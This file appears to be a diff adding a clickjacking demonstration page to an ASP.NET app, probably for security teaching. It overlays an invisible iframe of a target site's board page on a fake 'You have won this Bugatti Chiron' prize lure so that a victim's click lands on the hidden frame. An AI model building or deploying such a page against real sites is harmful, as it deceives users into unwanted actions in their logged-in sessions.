@@ -1,0 +1,33 @@
+﻿
+@{
+    Layout = null;
+}
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta charset="utf-8" />
+</head>
+<body>
+    <style>
+        iframe { /* iframe from facebook.com */
+            width: 500px;
+            height: 600px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            filter: alpha(opacity=50); /* in real life opacity=0 */
+            opacity: 0;
+        }
+    </style>
+    <div style="font-size:30px">WINNER!</div>
+    <iframe src="@ViewBag.ClickJackUrl/boards/view/9"></iframe>
+
+    <img src="~/images/chiron.jpg" width="600" /><br />
+    <a href="http://www.google.com" target="_blank" style="position: relative; left: 280px; top:50px; z-index: -1">CLICK ME!</a>
+
+    <div>You have won this Bugatti Chiron. Just click the link to collect your prize!</div>
+
+</body>
+</html>
+
